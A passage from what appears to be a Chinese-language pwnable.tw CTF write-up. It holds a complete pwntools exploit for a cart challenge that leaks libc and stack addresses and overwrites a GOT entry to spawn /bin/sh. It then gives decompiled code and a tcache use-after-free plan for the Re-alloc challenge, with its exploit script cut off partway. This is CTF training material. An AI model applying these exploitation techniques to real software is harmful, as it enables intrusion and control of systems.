<span class="k">if</span> <span class="s1">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> <span class="s1">&#39;r&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Test in local...&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">if</span> <span class="s1">&#39;r&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Attacking...&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span><span class="mi">10104</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="c1">#libc = ELF(&#39;&#39;,checksec=False)</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">atoi_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
<span class="n">mycart</span> <span class="o">=</span> <span class="mh">0x804B068</span>
<span class="n">add</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span><span class="n">delete</span><span class="o">=</span><span class="s1">&#39;3&#39;</span><span class="p">;</span><span class="n">cart</span><span class="o">=</span><span class="s1">&#39;4&#39;</span><span class="p">;</span><span class="n">checkout</span><span class="o">=</span><span class="s1">&#39;5&#39;</span>

<span class="k">def</span> <span class="nf">do</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="n">choice</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
	<span class="n">do</span><span class="p">(</span><span class="n">add</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
	<span class="n">do</span><span class="p">(</span><span class="n">add</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>

<span class="n">do</span><span class="p">(</span><span class="n">checkout</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;y&#39;</span><span class="p">)</span> <span class="c1">#add iphone-8</span>

<span class="n">payload</span><span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;y</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mycart</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">do</span><span class="p">(</span><span class="n">cart</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;27: &#39;</span><span class="p">)</span>
<span class="n">puts_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;28: &#39;</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;puts addr&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;heap addr&#39;</span><span class="p">,</span><span class="n">heap_addr</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
<span class="n">libcbase</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;libc base&#39;</span><span class="p">,</span><span class="n">libcbase</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>

<span class="n">env</span> <span class="o">=</span> <span class="n">libcbase</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;environ&#39;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;y</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">env</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">mycart</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">do</span><span class="p">(</span><span class="n">cart</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;27: &#39;</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;stack&#39;</span><span class="p">,</span><span class="n">stack</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;27&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">env</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">atoi_got</span><span class="o">+</span><span class="mh">0x22</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="mh">0xc</span><span class="p">)</span>

<span class="n">do</span><span class="p">(</span><span class="n">delete</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;;/bin/sh&#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="pwnabletw-re-alloc">pwnable.tw-Re-alloc</h1>
<h2 id="checksec-2">checksec</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    FORTIFY:  Enabled
</code></pre></td></tr></table>
</div>
</div><h2 id="ida-2">IDA</h2>
<p><strong>add</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">allocate</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index:&#34;</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">heap</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid !&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Size:&#34;</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x78</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v4</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">heap</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data:&#34;</span><span class="p">);</span>
        <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">heap</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">+</span> <span class="n">read_input</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="n">v2</span><span class="p">],</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">size</span><span class="p">));</span>
        <span class="o">*</span><span class="n">v0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;alloc error&#34;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Too large!&#34;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>edit</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">reallocate</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index:&#34;</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">||</span> <span class="o">!</span><span class="n">heap</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid !&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Size:&#34;</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x78</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Too large!&#34;</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">realloc</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">heap</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;alloc error&#34;</span><span class="p">);</span>
  <span class="n">heap</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data:&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">read_input</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>free</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">rfree</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index:&#34;</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid !&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">realloc</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">heap</span><span class="p">[</span><span class="n">v2</span><span class="p">],</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">heap</span><span class="p">;</span>
    <span class="n">heap</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>程序的各种功能都是由<code>realloc</code>来实现的。<code>realloc</code>有两个参数<code>ptr</code>与<code>size</code>：</p>
<ul>
<li><code>ptr == NULL</code>：其与<code>malloc</code><strong>等价</strong></li>
<li><code>ptr != NULL</code>:
<ul>
<li><code>new size == old size</code>：直接将<code>ptr</code>返回。</li>
<li><code>new size &lt; old size</code>：将<code>ptr</code>进行分割，剩余部分若大于最小chunk的大小就会被free</li>
<li><code>new size &gt; old size</code>：调用<code>malloc</code>申请一块新的内存，拷贝数据后将<code>old ptr</code>释放</li>
<li><code>new size == 0</code>：与<code>free</code><strong>等价</strong></li>
</ul>
</li>
</ul>
<p>在<code>edit</code>中，若<code>new size</code>为0，就相当于对chunk进行了free，free的返回值为0。程序进行了返回，没有将原来的指针进行更新，所以我们可以进行UAF。</p>
<p>got表可写，但是没有show函数，先想办法通过修改got表进行leak。计划修改<code>atoll_got</code>为<code>printf_plt</code>，我们就可以通过格式化字符串漏洞来泄露got表中的地址，从而leak libc。</p>
<p>首先，申请一个chunk，使用<code>edit</code>将其free，并修改其<code>fd</code>指向<code>atoll_got</code>。然后，再将这个chunk申请回来，这时<code>next</code>就会被填入<code>atoll_got</code>。为了不影响最开始的这个<code>tcache bin</code>，我们<code>realloc</code>这个chunk，为一个新大小，然后free掉。这时，这个chunk的key被清空了，但是heap数组中还有这个chunk的指针，而且我么没法直接覆盖，所以我们再次通过<code>realloc</code>修改器key域为垃圾数据，将其free就可以清空heap数组了。最后，一个<code>tcache bin</code>的<code>next</code>不为<code>NULL</code>但是count为0，之后再申请对应的大小就会让count造成溢出。</p>
<p>在leak libc后，还要再次进行修改，所以我们再次使用上述操作，使另一个<code>tcache bin</code>的<code>next</code>指向<code>atoll_got</code>。</p>
<h2 id="exp-2">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from LibcSearcher import LibcSearcher</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="s1"> addr ---&gt; </span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span> <span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="n">binary</span><span class="o">=</span><span class="s1">&#39;./re-alloc&#39;</span>
<span class="c1">#gdb.attach(sh)</span>
<span class="k">if</span> <span class="s1">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> <span class="s1">&#39;r&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Test in local...&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">if</span> <span class="s1">&#39;r&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Attacking...&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span> <span class="mi">10106</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc.so&#39;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Size:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Data:&#39;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Size:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">size</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Data:&#39;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice: &#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
	<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>	

